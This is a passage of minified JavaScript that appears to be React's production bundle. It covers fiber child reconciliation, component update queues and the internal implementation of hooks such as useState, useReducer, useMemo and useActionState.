                I !== null && (l && I.alternate !== null && D.delete(I.key === null ? K : I.key),
                o = n(I, o, K),
                el === null ? C = I : el.sibling = I,
                el = I);
            return l && D.forEach(function(Te) {
                return t(m, Te)
            }),
            P && Xt(m, K),
            C
        }
        function q(m, o, h, b) {
            if (h == null)
                throw Error(r(151));
            for (var C = null, el = null, D = o, K = o = 0, I = null, al = h.next(); D !== null && !al.done; K++,
            al = h.next()) {
                D.index > K ? (I = D,
                D = null) : I = D.sibling;
                var Te = v(m, D, al.value, b);
                if (Te === null) {
                    D === null && (D = I);
                    break
                }
                l && D && Te.alternate === null && t(m, D),
                o = n(Te, o, K),
                el === null ? C = Te : el.sibling = Te,
                el = Te,
                D = I
            }
            if (al.done)
                return e(m, D),
                P && Xt(m, K),
                C;
            if (D === null) {
                for (; !al.done; K++,
                al = h.next())
                    al = x(m, al.value, b),
                    al !== null && (o = n(al, o, K),
                    el === null ? C = al : el.sibling = al,
                    el = al);
                return P && Xt(m, K),
                C
            }
            for (D = a(D); !al.done; K++,
            al = h.next())
                al = g(D, m, K, al.value, b),
                al !== null && (l && al.alternate !== null && D.delete(al.key === null ? K : al.key),
                o = n(al, o, K),
                el === null ? C = al : el.sibling = al,
                el = al);
            return l && D.forEach(function(th) {
                return t(m, th)
            }),
            P && Xt(m, K),
            C
        }
        function ml(m, o, h, b) {
            if (typeof h == "object" && h !== null && h.type === Nl && h.key === null && (h = h.props.children),
            typeof h == "object" && h !== null) {
                switch (h.$$typeof) {
                case Zl:
                    l: {
                        for (var C = h.key; o !== null; ) {
                            if (o.key === C) {
                                if (C = h.type,
                                C === Nl) {
                                    if (o.tag === 7) {
                                        e(m, o.sibling),
                                        b = u(o, h.props.children),
                                        b.return = m,
                                        m = b;
                                        break l
                                    }
                                } else if (o.elementType === C || typeof C == "object" && C !== null && C.$$typeof === Xl && Ye(C) === o.type) {
                                    e(m, o.sibling),
                                    b = u(o, h.props),
                                    $a(b, h),
                                    b.return = m,
                                    m = b;
                                    break l
                                }
                                e(m, o);
                                break
                            } else
                                t(m, o);
                            o = o.sibling
                        }
                        h.type === Nl ? (b = Re(h.props.children, m.mode, b, h.key),
                        b.return = m,
                        m = b) : (b = Ku(h.type, h.key, h.props, null, m.mode, b),
                        $a(b, h),
                        b.return = m,
                        m = b)
                    }
                    return i(m);
                case Yl:
                    l: {
                        for (C = h.key; o !== null; ) {
                            if (o.key === C)
                                if (o.tag === 4 && o.stateNode.containerInfo === h.containerInfo && o.stateNode.implementation === h.implementation) {
                                    e(m, o.sibling),
                                    b = u(o, h.children || []),
                                    b.return = m,
                                    m = b;
                                    break l
                                } else {
                                    e(m, o);
                                    break
                                }
                            else
                                t(m, o);
                            o = o.sibling
                        }
                        b = Ai(h, m.mode, b),
                        b.return = m,
                        m = b
                    }
                    return i(m);
                case Xl:
                    return h = Ye(h),
                    ml(m, o, h, b)
                }
                if (tt(h))
                    return j(m, o, h, b);
                if (Ql(h)) {
                    if (C = Ql(h),
                    typeof C != "function")
                        throw Error(r(150));
                    return h = C.call(h),
                    q(m, o, h, b)
                }
                if (typeof h.then == "function")
                    return ml(m, o, Iu(h), b);
                if (h.$$typeof === jl)
                    return ml(m, o, Wu(m, h), b);
                Pu(m, h)
            }
            return typeof h == "string" && h !== "" || typeof h == "number" || typeof h == "bigint" ? (h = "" + h,
            o !== null && o.tag === 6 ? (e(m, o.sibling),
            b = u(o, h),
            b.return = m,
            m = b) : (e(m, o),
            b = Ti(h, m.mode, b),
            b.return = m,
            m = b),
            i(m)) : e(m, o)
        }
        return function(m, o, h, b) {
            try {
                ka = 0;
                var C = ml(m, o, h, b);
                return ha = null,
                C
            } catch (D) {
                if (D === ma || D === $u)
                    throw D;
                var el = it(29, D, null, m.mode);
                return el.lanes = b,
                el.return = m,
                el
            }
        }
    }
    var Xe = Ds(!0)
      , Ns = Ds(!1)
      , ce = !1;
    function qi(l) {
        l.updateQueue = {
            baseState: l.memoizedState,
            firstBaseUpdate: null,
            lastBaseUpdate: null,
            shared: {
                pending: null,
                lanes: 0,
                hiddenCallbacks: null
            },
            callbacks: null
        }
    }
    function Yi(l, t) {
        l = l.updateQueue,
        t.updateQueue === l && (t.updateQueue = {
            baseState: l.baseState,
            firstBaseUpdate: l.firstBaseUpdate,
            lastBaseUpdate: l.lastBaseUpdate,
            shared: l.shared,
            callbacks: null
        })
    }
    function fe(l) {
        return {
            lane: l,
            tag: 0,
            payload: null,
            callback: null,
            next: null
        }
    }
    function se(l, t, e) {
        var a = l.updateQueue;
        if (a === null)
            return null;
        if (a = a.shared,
        (nl & 2) !== 0) {
            var u = a.pending;
            return u === null ? t.next = t : (t.next = u.next,
            u.next = t),
            a.pending = t,
            t = Vu(l),
            hs(l, null, e),
            t
        }
        return Zu(l, a, t, e),
        Vu(l)
    }
    function Fa(l, t, e) {
        if (t = t.updateQueue,
        t !== null && (t = t.shared,
        (e & 4194048) !== 0)) {
            var a = t.lanes;
            a &= l.pendingLanes,
            e |= a,
            t.lanes = e,
            zf(l, e)
        }
    }
    function Gi(l, t) {
        var e = l.updateQueue
          , a = l.alternate;
        if (a !== null && (a = a.updateQueue,
        e === a)) {
            var u = null
              , n = null;
            if (e = e.firstBaseUpdate,
            e !== null) {
                do {
                    var i = {
                        lane: e.lane,
                        tag: e.tag,
                        payload: e.payload,
                        callback: null,
                        next: null
                    };
                    n === null ? u = n = i : n = n.next = i,
                    e = e.next
                } while (e !== null);
                n === null ? u = n = t : n = n.next = t
            } else
                u = n = t;
            e = {
                baseState: a.baseState,
                firstBaseUpdate: u,
                lastBaseUpdate: n,
                shared: a.shared,
                callbacks: a.callbacks
            },
            l.updateQueue = e;
            return
        }
        l = e.lastBaseUpdate,
        l === null ? e.firstBaseUpdate = t : l.next = t,
        e.lastBaseUpdate = t
    }
    var Xi = !1;
    function Ia() {
        if (Xi) {
            var l = ra;
            if (l !== null)
                throw l
        }
    }
    function Pa(l, t, e, a) {
        Xi = !1;
        var u = l.updateQueue;
        ce = !1;
        var n = u.firstBaseUpdate
          , i = u.lastBaseUpdate
          , c = u.shared.pending;
        if (c !== null) {
            u.shared.pending = null;
            var s = c
              , y = s.next;
            s.next = null,
            i === null ? n = y : i.next = y,
            i = s;
            var S = l.alternate;
            S !== null && (S = S.updateQueue,
            c = S.lastBaseUpdate,
            c !== i && (c === null ? S.firstBaseUpdate = y : c.next = y,
            S.lastBaseUpdate = s))
        }
        if (n !== null) {
            var x = u.baseState;
            i = 0,
            S = y = s = null,
            c = n;
            do {
                var v = c.lane & -536870913
                  , g = v !== c.lane;
                if (g ? (F & v) === v : (a & v) === v) {
                    v !== 0 && v === da && (Xi = !0),
                    S !== null && (S = S.next = {
                        lane: 0,
                        tag: c.tag,
                        payload: c.payload,
                        callback: null,
                        next: null
                    });
                    l: {
                        var j = l
                          , q = c;
                        v = t;
                        var ml = e;
                        switch (q.tag) {
                        case 1:
                            if (j = q.payload,
                            typeof j == "function") {
                                x = j.call(ml, x, v);
                                break l
                            }
                            x = j;
                            break l;
                        case 3:
                            j.flags = j.flags & -65537 | 128;
                        case 0:
                            if (j = q.payload,
                            v = typeof j == "function" ? j.call(ml, x, v) : j,
                            v == null)
                                break l;
                            x = U({}, x, v);
                            break l;
                        case 2:
                            ce = !0
                        }
                    }
                    v = c.callback,
                    v !== null && (l.flags |= 64,
                    g && (l.flags |= 8192),
                    g = u.callbacks,
                    g === null ? u.callbacks = [v] : g.push(v))
                } else
                    g = {
                        lane: v,
                        tag: c.tag,
                        payload: c.payload,
                        callback: c.callback,
                        next: null
                    },
                    S === null ? (y = S = g,
                    s = x) : S = S.next = g,
                    i |= v;
                if (c = c.next,
                c === null) {
                    if (c = u.shared.pending,
                    c === null)
                        break;
                    g = c,
                    c = g.next,
                    g.next = null,
                    u.lastBaseUpdate = g,
                    u.shared.pending = null
                }
            } while (!0);
            S === null && (s = x),
            u.baseState = s,
            u.firstBaseUpdate = y,
            u.lastBaseUpdate = S,
            n === null && (u.shared.lanes = 0),
            he |= i,
            l.lanes = i,
            l.memoizedState = x
        }
    }
    function Us(l, t) {
        if (typeof l != "function")
            throw Error(r(191, l));
        l.call(t)
    }
    function Rs(l, t) {
        var e = l.callbacks;
        if (e !== null)
            for (l.callbacks = null,
            l = 0; l < e.length; l++)
                Us(e[l], t)
    }
    var ya = d(null)
      , ln = d(0);
    function Cs(l, t) {
        l = Ft,
        M(ln, l),
        M(ya, t),
        Ft = l | t.baseLanes
    }
    function Qi() {
        M(ln, Ft),
        M(ya, ya.current)
    }
    function Li() {
        Ft = ln.current,
        z(ya),
        z(ln)
    }
    var ct = d(null)
      , xt = null;
    function oe(l) {
        var t = l.alternate;
        M(bl, bl.current & 1),
        M(ct, l),
        xt === null && (t === null || ya.current !== null || t.memoizedState !== null) && (xt = l)
    }
    function Zi(l) {
        M(bl, bl.current),
        M(ct, l),
        xt === null && (xt = l)
    }
    function Hs(l) {
        l.tag === 22 ? (M(bl, bl.current),
        M(ct, l),
        xt === null && (xt = l)) : de()
    }
    function de() {
        M(bl, bl.current),
        M(ct, ct.current)
    }
    function ft(l) {
        z(ct),
        xt === l && (xt = null),
        z(bl)
    }
    var bl = d(0);
    function tn(l) {
        for (var t = l; t !== null; ) {
            if (t.tag === 13) {
                var e = t.memoizedState;
                if (e !== null && (e = e.dehydrated,
                e === null || kc(e) || $c(e)))
                    return t
            } else if (t.tag === 19 && (t.memoizedProps.revealOrder === "forwards" || t.memoizedProps.revealOrder === "backwards" || t.memoizedProps.revealOrder === "unstable_legacy-backwards" || t.memoizedProps.revealOrder === "together")) {
                if ((t.flags & 128) !== 0)
                    return t
            } else if (t.child !== null) {
                t.child.return = t,
                t = t.child;
                continue
            }
            if (t === l)
                break;
            for (; t.sibling === null; ) {
                if (t.return === null || t.return === l)
                    return null;
                t = t.return
            }
            t.sibling.return = t.return,
            t = t.sibling
        }
        return null
    }
    var Zt = 0
      , V = null
      , dl = null
      , El = null
      , en = !1
      , va = !1
      , Qe = !1
      , an = 0
      , lu = 0
      , ga = null
      , K0 = 0;
    function Sl() {
        throw Error(r(321))
    }
    function Vi(l, t) {
        if (t === null)
            return !1;
        for (var e = 0; e < t.length && e < l.length; e++)
            if (!nt(l[e], t[e]))
                return !1;
        return !0
    }
    function Ki(l, t, e, a, u, n) {
        return Zt = n,
        V = t,
        t.memoizedState = null,
        t.updateQueue = null,
        t.lanes = 0,
        p.H = l === null || l.memoizedState === null ? po : ic,
        Qe = !1,
        n = e(a, u),
        Qe = !1,
        va && (n = qs(t, e, a, u)),
        Bs(l),
        n
    }
    function Bs(l) {
        p.H = au;
        var t = dl !== null && dl.next !== null;
        if (Zt = 0,
        El = dl = V = null,
        en = !1,
        lu = 0,
        ga = null,
        t)
            throw Error(r(300));
        l === null || Tl || (l = l.dependencies,
        l !== null && wu(l) && (Tl = !0))
    }
    function qs(l, t, e, a) {
        V = l;
        var u = 0;
        do {
            if (va && (ga = null),
            lu = 0,
            va = !1,
            25 <= u)
                throw Error(r(301));
            if (u += 1,
            El = dl = null,
            l.updateQueue != null) {
                var n = l.updateQueue;
                n.lastEffect = null,
                n.events = null,
                n.stores = null,
                n.memoCache != null && (n.memoCache.index = 0)
            }
            p.H = bo,
            n = t(e, a)
        } while (va);
        return n
    }
    function J0() {
        var l = p.H
          , t = l.useState()[0];
        return t = typeof t.then == "function" ? tu(t) : t,
        l = l.useState()[0],
        (dl !== null ? dl.memoizedState : null) !== l && (V.flags |= 1024),
        t
    }
    function Ji() {
        var l = an !== 0;
        return an = 0,
        l
    }
    function wi(l, t, e) {
        t.updateQueue = l.updateQueue,
        t.flags &= -2053,
        l.lanes &= ~e
    }
    function Wi(l) {
        if (en) {
            for (l = l.memoizedState; l !== null; ) {
                var t = l.queue;
                t !== null && (t.pending = null),
                l = l.next
            }
            en = !1
        }
        Zt = 0,
        El = dl = V = null,
        va = !1,
        lu = an = 0,
        ga = null
    }
    function Kl() {
        var l = {
            memoizedState: null,
            baseState: null,
            baseQueue: null,
            queue: null,
            next: null
        };
        return El === null ? V.memoizedState = El = l : El = El.next = l,
        El
    }
    function xl() {
        if (dl === null) {
            var l = V.alternate;
            l = l !== null ? l.memoizedState : null
        } else
            l = dl.next;
        var t = El === null ? V.memoizedState : El.next;
        if (t !== null)
            El = t,
            dl = l;
        else {
            if (l === null)
                throw V.alternate === null ? Error(r(467)) : Error(r(310));
            dl = l,
            l = {
                memoizedState: dl.memoizedState,
                baseState: dl.baseState,
                baseQueue: dl.baseQueue,
                queue: dl.queue,
                next: null
            },
            El === null ? V.memoizedState = El = l : El = El.next = l
        }
        return El
    }
    function un() {
        return {
            lastEffect: null,
            events: null,
            stores: null,
            memoCache: null
        }
    }
    function tu(l) {
        var t = lu;
        return lu += 1,
        ga === null && (ga = []),
        l = js(ga, l, t),
        t = V,
        (El === null ? t.memoizedState : El.next) === null && (t = t.alternate,
        p.H = t === null || t.memoizedState === null ? po : ic),
        l
    }
    function nn(l) {
        if (l !== null && typeof l == "object") {
            if (typeof l.then == "function")
                return tu(l);
            if (l.$$typeof === jl)
                return Hl(l)
        }
        throw Error(r(438, String(l)))
    }
    function ki(l) {
        var t = null
          , e = V.updateQueue;
        if (e !== null && (t = e.memoCache),
        t == null) {
            var a = V.alternate;
            a !== null && (a = a.updateQueue,
            a !== null && (a = a.memoCache,
            a != null && (t = {
                data: a.data.map(function(u) {
                    return u.slice()
                }),
                index: 0
            })))
        }
        if (t == null && (t = {
            data: [],
            index: 0
        }),
        e === null && (e = un(),
        V.updateQueue = e),
        e.memoCache = t,
        e = t.data[t.index],
        e === void 0)
            for (e = t.data[t.index] = Array(l),
            a = 0; a < l; a++)
                e[a] = Dt;
        return t.index++,
        e
    }
    function Vt(l, t) {
        return typeof t == "function" ? t(l) : t
    }
    function cn(l) {
        var t = xl();
        return $i(t, dl, l)
    }
    function $i(l, t, e) {
        var a = l.queue;
        if (a === null)
            throw Error(r(311));
        a.lastRenderedReducer = e;
        var u = l.baseQueue
          , n = a.pending;
        if (n !== null) {
            if (u !== null) {
                var i = u.next;
                u.next = n.next,
                n.next = i
            }
            t.baseQueue = u = n,
            a.pending = null
        }
        if (n = l.baseState,
        u === null)
            l.memoizedState = n;
        else {
            t = u.next;
            var c = i = null
              , s = null
              , y = t
              , S = !1;
            do {
                var x = y.lane & -536870913;
                if (x !== y.lane ? (F & x) === x : (Zt & x) === x) {
                    var v = y.revertLane;
                    if (v === 0)
                        s !== null && (s = s.next = {
                            lane: 0,
                            revertLane: 0,
                            gesture: null,
                            action: y.action,
                            hasEagerState: y.hasEagerState,
                            eagerState: y.eagerState,
                            next: null
                        }),
                        x === da && (S = !0);
                    else if ((Zt & v) === v) {
                        y = y.next,
                        v === da && (S = !0);
                        continue
                    } else
                        x = {
                            lane: 0,
                            revertLane: y.revertLane,
                            gesture: null,
                            action: y.action,
                            hasEagerState: y.hasEagerState,
                            eagerState: y.eagerState,
                            next: null
                        },
                        s === null ? (c = s = x,
                        i = n) : s = s.next = x,
                        V.lanes |= v,
                        he |= v;
                    x = y.action,
                    Qe && e(n, x),
                    n = y.hasEagerState ? y.eagerState : e(n, x)
                } else
                    v = {
                        lane: x,
                        revertLane: y.revertLane,
                        gesture: y.gesture,
                        action: y.action,
                        hasEagerState: y.hasEagerState,
                        eagerState: y.eagerState,
                        next: null
                    },
                    s === null ? (c = s = v,
                    i = n) : s = s.next = v,
                    V.lanes |= x,
                    he |= x;
                y = y.next
            } while (y !== null && y !== t);
            if (s === null ? i = n : s.next = c,
            !nt(n, l.memoizedState) && (Tl = !0,
            S && (e = ra,
            e !== null)))
                throw e;
            l.memoizedState = n,
            l.baseState = i,
            l.baseQueue = s,
            a.lastRenderedState = n
        }
        return u === null && (a.lanes = 0),
        [l.memoizedState, a.dispatch]
    }
    function Fi(l) {
        var t = xl()
          , e = t.queue;
        if (e === null)
            throw Error(r(311));
        e.lastRenderedReducer = l;
        var a = e.dispatch
          , u = e.pending
          , n = t.memoizedState;
        if (u !== null) {
            e.pending = null;
            var i = u = u.next;
            do
                n = l(n, i.action),
                i = i.next;
            while (i !== u);
            nt(n, t.memoizedState) || (Tl = !0),
            t.memoizedState = n,
            t.baseQueue === null && (t.baseState = n),
            e.lastRenderedState = n
        }
        return [n, a]
    }
    function Ys(l, t, e) {
        var a = V
          , u = xl()
          , n = P;
        if (n) {
            if (e === void 0)
                throw Error(r(407));
            e = e()
        } else
            e = t();
        var i = !nt((dl || u).memoizedState, e);
        if (i && (u.memoizedState = e,
        Tl = !0),
        u = u.queue,
        lc(Qs.bind(null, a, u, l), [l]),
        u.getSnapshot !== t || i || El !== null && El.memoizedState.tag & 1) {
            if (a.flags |= 2048,
            Sa(9, {
                destroy: void 0
            }, Xs.bind(null, a, u, e, t), null),
            hl === null)
                throw Error(r(349));
            n || (Zt & 127) !== 0 || Gs(a, t, e)
        }
        return e
    }
    function Gs(l, t, e) {
        l.flags |= 16384,
        l = {
            getSnapshot: t,
            value: e
        },
        t = V.updateQueue,
        t === null ? (t = un(),
        V.updateQueue = t,
        t.stores = [l]) : (e = t.stores,
        e === null ? t.stores = [l] : e.push(l))
    }
    function Xs(l, t, e, a) {
        t.value = e,
        t.getSnapshot = a,
        Ls(t) && Zs(l)
    }
    function Qs(l, t, e) {
        return e(function() {
            Ls(t) && Zs(l)
        })
    }
    function Ls(l) {
        var t = l.getSnapshot;
        l = l.value;
        try {
            var e = t();
            return !nt(l, e)
        } catch {
            return !0
        }
    }
    function Zs(l) {
        var t = Ue(l, 2);
        t !== null && Pl(t, l, 2)
    }
    function Ii(l) {
        var t = Kl();
        if (typeof l == "function") {
            var e = l;
            if (l = e(),
            Qe) {
                le(!0);
                try {
                    e()
                } finally {
                    le(!1)
                }
            }
        }
        return t.memoizedState = t.baseState = l,
        t.queue = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: Vt,
            lastRenderedState: l
        },
        t
    }
    function Vs(l, t, e, a) {
        return l.baseState = e,
        $i(l, dl, typeof a == "function" ? a : Vt)
    }
    function w0(l, t, e, a, u) {
        if (on(l))
            throw Error(r(485));
        if (l = t.action,
        l !== null) {
            var n = {
                payload: u,
                action: l,
                next: null,
                isTransition: !0,
                status: "pending",
                value: null,
                reason: null,
                listeners: [],
                then: function(i) {
                    n.listeners.push(i)
                }
            };
            p.T !== null ? e(!0) : n.isTransition = !1,
            a(n),
            e = t.pending,
            e === null ? (n.next = t.pending = n,
            Ks(t, n)) : (n.next = e.next,
            t.pending = e.next = n)
        }
    }
    function Ks(l, t) {
        var e = t.action
          , a = t.payload
          , u = l.state;
        if (t.isTransition) {
            var n = p.T
              , i = {};
            p.T = i;
            try {
                var c = e(u, a)
                  , s = p.S;
                s !== null && s(i, c),
                Js(l, t, c)
            } catch (y) {
                Pi(l, t, y)
            } finally {
                n !== null && i.types !== null && (n.types = i.types),
                p.T = n
            }
        } else
            try {
                n = e(u, a),
                Js(l, t, n)
            } catch (y) {
                Pi(l, t, y)
            }
    }
    function Js(l, t, e) {
        e !== null && typeof e == "object" && typeof e.then == "function" ? e.then(function(a) {
            ws(l, t, a)
        }, function(a) {
            return Pi(l, t, a)
        }) : ws(l, t, e)
    }
    function ws(l, t, e) {
        t.status = "fulfilled",
        t.value = e,
        Ws(t),
        l.state = e,
        t = l.pending,
        t !== null && (e = t.next,
        e === t ? l.pending = null : (e = e.next,
        t.next = e,
        Ks(l, e)))
    }
    function Pi(l, t, e) {
        var a = l.pending;
        if (l.pending = null,
        a !== null) {
            a = a.next;
            do
                t.status = "rejected",
                t.reason = e,
                Ws(t),
                t = t.next;
            while (t !== a)
        }
        l.action = null
    }
    function Ws(l) {
        l = l.listeners;
        for (var t = 0; t < l.length; t++)
            (0,
            l[t])()
    }
    function ks(l, t) {
        return t
    }
    function $s(l, t) {
        if (P) {
            var e = hl.formState;
            if (e !== null) {
                l: {
                    var a = V;
                    if (P) {
                        if (yl) {
                            t: {
                                for (var u = yl, n = bt; u.nodeType !== 8; ) {
                                    if (!n) {
                                        u = null;
                                        break t
                                    }
                                    if (u = zt(u.nextSibling),
                                    u === null) {
                                        u = null;
                                        break t
                                    }
                                }
                                n = u.data,
                                u = n === "F!" || n === "F" ? u : null
                            }
                            if (u) {
                                yl = zt(u.nextSibling),
                                a = u.data === "F!";
                                break l
                            }
                        }
                        ne(a)
                    }
                    a = !1
                }
                a && (t = e[0])
            }
        }
        return e = Kl(),
        e.memoizedState = e.baseState = t,
        a = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: ks,
            lastRenderedState: t
        },
        e.queue = a,
        e = vo.bind(null, V, a),
        a.dispatch = e,
        a = Ii(!1),
        n = nc.bind(null, V, !1, a.queue),
        a = Kl(),
        u = {
            state: t,
            dispatch: null,
            action: l,
            pending: null
        },
        a.queue = u,
        e = w0.bind(null, V, u, n, e),
        u.dispatch = e,
        a.memoizedState = l,
        [t, e, !1]
    }
    function Fs(l) {
        var t = xl();
        return Is(t, dl, l)
    }
    function Is(l, t, e) {
        if (t = $i(l, t, ks)[0],
        l = cn(Vt)[0],
        typeof t == "object" && t !== null && typeof t.then == "function")
            try {
                var a = tu(t)
            } catch (i) {
                throw i === ma ? $u : i
            }
        else
            a = t;
        t = xl();
        var u = t.queue
          , n = u.dispatch;
        return e !== t.memoizedState && (V.flags |= 2048,
        Sa(9, {
            destroy: void 0
        }, W0.bind(null, u, e), null)),
        [a, n, l]
    }
    function W0(l, t) {
        l.action = t
    }
    function Ps(l) {
        var t = xl()
          , e = dl;
        if (e !== null)
            return Is(t, e, l);
        xl(),
        t = t.memoizedState,
        e = xl();
        var a = e.queue.dispatch;
        return e.memoizedState = l,
        [t, a, !1]
    }
    function Sa(l, t, e, a) {
        return l = {
            tag: l,
            create: e,
            deps: a,
            inst: t,
            next: null
        },
        t = V.updateQueue,
        t === null && (t = un(),
        V.updateQueue = t),
        e = t.lastEffect,
        e === null ? t.lastEffect = l.next = l : (a = e.next,
        e.next = l,
        l.next = a,
        t.lastEffect = l),
        l
    }
    function lo() {
        return xl().memoizedState
    }
    function fn(l, t, e, a) {
        var u = Kl();
        V.flags |= l,
        u.memoizedState = Sa(1 | t, {
            destroy: void 0
        }, e, a === void 0 ? null : a)
    }
    function sn(l, t, e, a) {
        var u = xl();
        a = a === void 0 ? null : a;
        var n = u.memoizedState.inst;
        dl !== null && a !== null && Vi(a, dl.memoizedState.deps) ? u.memoizedState = Sa(t, n, e, a) : (V.flags |= l,
        u.memoizedState = Sa(1 | t, n, e, a))
    }
    function to(l, t) {
        fn(8390656, 8, l, t)
    }
    function lc(l, t) {
        sn(2048, 8, l, t)
    }
    function k0(l) {
        V.flags |= 4;
        var t = V.updateQueue;
        if (t === null)
            t = un(),
            V.updateQueue = t,
            t.events = [l];
        else {
            var e = t.events;
            e === null ? t.events = [l] : e.push(l)
        }
    }
    function eo(l) {
        var t = xl().memoizedState;
        return k0({
            ref: t,
            nextImpl: l
        }),
        function() {
            if ((nl & 2) !== 0)
                throw Error(r(440));
            return t.impl.apply(void 0, arguments)
        }
    }
    function ao(l, t) {
        return sn(4, 2, l, t)
    }
    function uo(l, t) {
        return sn(4, 4, l, t)
    }
    function no(l, t) {
        if (typeof t == "function") {
            l = l();
            var e = t(l);
            return function() {
                typeof e == "function" ? e() : t(null)
            }
        }
        if (t != null)
            return l = l(),
            t.current = l,
            function() {
                t.current = null
            }
    }
    function io(l, t, e) {
        e = e != null ? e.concat([l]) : null,
        sn(4, 4, no.bind(null, t, l), e)
    }
    function tc() {}
    function co(l, t) {
        var e = xl();
        t = t === void 0 ? null : t;
        var a = e.memoizedState;
        return t !== null && Vi(t, a[1]) ? a[0] : (e.memoizedState = [l, t],
        l)
    }
    function fo(l, t) {
        var e = xl();
        t = t === void 0 ? null : t;
        var a = e.memoizedState;
        if (t !== null && Vi(t, a[1]))
            return a[0];
        if (a = l(),
        Qe) {
            le(!0);
            try {
                l()
            } finally {
                le(!1)
            }
        }
        return e.memoizedState = [a, t],
        a
    }
    function ec(l, t, e) {
        return e === void 0 || (Zt & 1073741824) !== 0 && (F & 261930) === 0 ? l.memoizedState = t : (l.memoizedState = e,
        l = od(),
        V.lanes |= l,
        he |= l,
        e)
    }
    function so(l, t, e, a) {
        return nt(e, t) ? e : ya.current !== null ? (l = ec(l, e, a),
        nt(l, t) || (Tl = !0),
        l) : (Zt & 42) === 0 || (Zt & 1073741824) !== 0 && (F & 261930) === 0 ? (Tl = !0,
        l.memoizedState = e) : (l = od(),
        V.lanes |= l,
        he |= l,
        t)
    }
    function oo(l, t, e, a, u) {
        var n = A.p;
        A.p = n !== 0 && 8 > n ? n : 8;
        var i = p.T
          , c = {};
        p.T = c,
        nc(l, !1, t, e);
        try {
            var s = u()
              , y = p.S;
            if (y !== null && y(c, s),
            s !== null && typeof s == "object" && typeof s.then == "function") {
                var S = V0(s, a);
                eu(l, t, S, dt(l))
            } else
                eu(l, t, a, dt(l))
        } catch (x) {
            eu(l, t, {
                then: function() {},
                status: "rejected",
                reason: x
            }, dt())
        } finally {
            A.p = n,
            i !== null && c.types !== null && (i.types = c.types),
            p.T = i
        }
    }
    function $0() {}
    function ac(l, t, e, a) {
        if (l.tag !== 5)
            throw Error(r(476));
        var u = ro(l).queue;
        oo(l, u, t, Y, e === null ? $0 : function() {
            return mo(l),
            e(a)
        }
        )
    }
    function ro(l) {
        var t = l.memoizedState;
        if (t !== null)
            return t;
        t = {
            memoizedState: Y,
            baseState: Y,
            baseQueue: null,
            queue: {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: Vt,
                lastRenderedState: Y
            },
            next: null
        };
        var e = {};
        return t.next = {
            memoizedState: e,
            baseState: e,
            baseQueue: null,
            queue: {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: Vt,
                lastRenderedState: e
            },
            next: null
        },
        l.memoizedState = t,
        l = l.alternate,
        l !== null && (l.memoizedState = t),
        t
    }
    function mo(l) {
        var t = ro(l);
        t.next === null && (t = l.alternate.memoizedState),
        eu(l, t.next.queue, {}, dt())
    }
    function uc() {
        return Hl(pu)
    }
    function ho() {
        return xl().memoizedState
    }
    function yo() {
        return xl().memoizedState
    }
    function F0(l) {
        for (var t = l.return; t !== null; ) {
            switch (t.tag) {
            case 24:
            case 3:
                var e = dt();
                l = fe(e);
                var a = se(t, l, e);
                a !== null && (Pl(a, t, e),
                Fa(a, t, e)),
                t = {
                    cache: Ri()
                },
                l.payload = t;
                return
            }
            t = t.return
        }
    }
    function I0(l, t, e) {
        var a = dt();
        e = {
            lane: a,
            revertLane: 0,
            gesture: null,
            action: e,
            hasEagerState: !1,
            eagerState: null,
            next: null
        },
        on(l) ? go(t, e) : (e = zi(l, t, e, a),
        e !== null && (Pl(e, l, a),
        So(e, t, a)))
    }
    function vo(l, t, e) {
        var a = dt();
        eu(l, t, e, a)
    }
    function eu(l, t, e, a) {
        var u = {
            lane: a,
            revertLane: 0,
            gesture: null,
            action: e,
            hasEagerState: !1,
            eagerState: null,
            next: null
        };
        if (on(l))
            go(t, u);
        else {
            var n = l.alternate;
            if (l.lanes === 0 && (n === null || n.lanes === 0) && (n = t.lastRenderedReducer,
            n !== null))
                try {
                    var i = t.lastRenderedState
                      , c = n(i, e);
                    if (u.hasEagerState = !0,
                    u.eagerState = c,
                    nt(c, i))
                        return Zu(l, t, u, 0),
                        hl === null && Lu(),
                        !1
                } catch {}
            if (e = zi(l, t, u, a),
            e !== null)
                return Pl(e, l, a),
                So(e, t, a),
                !0
        }
        return !1
    }
    function nc(l, t, e, a) {
        if (a = {
            lane: 2,
            revertLane: qc(),
            gesture: null,
            action: a,
            hasEagerState: !1,
            eagerState: null,
            next: null
        },
        on(l)) {
            if (t)
                throw Error(r(479))
        } else
            t = zi(l, e, a, 2),
            t !== null && Pl(t, l, 2)
    }
    function on(l) {
        var t = l.alternate;
        return l === V || t !== null && t === V
    }
    function go(l, t) {
        va = en = !0;
        var e = l.pending;
        e === null ? t.next = t : (t.next = e.next,
        e.next = t),
        l.pending = t
    }
    function So(l, t, e) {
        if ((e & 4194048) !== 0) {
            var a = t.lanes;
            a &= l.pendingLanes,
            e |= a,
            t.lanes = e,
            zf(l, e)
        }
    }
    var au = {
        readContext: Hl,
        use: nn,
        useCallback: Sl,
        useContext: Sl,
        useEffect: Sl,
        useImperativeHandle: Sl,
        useLayoutEffect: Sl,
        useInsertionEffect: Sl,
        useMemo: Sl,
        useReducer: Sl,
        useRef: Sl,
        useState: Sl,
        useDebugValue: Sl,
        useDeferredValue: Sl,
        useTransition: Sl,
        useSyncExternalStore: Sl,
        useId: Sl,
        useHostTransitionStatus: Sl,
        useFormState: Sl,
        useActionState: Sl,
        useOptimistic: Sl,
        useMemoCache: Sl,
        useCacheRefresh: Sl
    };
    au.useEffectEvent = Sl;
    var po = {
        readContext: Hl,
        use: nn,
        useCallback: function(l, t) {
            return Kl().memoizedState = [l, t === void 0 ? null : t],
            l
        },
        useContext: Hl,
        useEffect: to,
        useImperativeHandle: function(l, t, e) {
            e = e != null ? e.concat([l]) : null,
            fn(4194308, 4, no.bind(null, t, l), e)
        },
        useLayoutEffect: function(l, t) {
            return fn(4194308, 4, l, t)
        },
        useInsertionEffect: function(l, t) {
            fn(4, 2, l, t)
        },
        useMemo: function(l, t) {
            var e = Kl();
            t = t === void 0 ? null : t;
            var a = l();
            if (Qe) {
                le(!0);
                try {
                    l()
                } finally {
                    le(!1)
                }
            }
            return e.memoizedState = [a, t],
            a
        },
        useReducer: function(l, t, e) {
            var a = Kl();
            if (e !== void 0) {
                var u = e(t);
                if (Qe) {
                    le(!0);
                    try {
                        e(t)
                    } finally {
                        le(!1)
                    }
                }
            } else
                u = t;
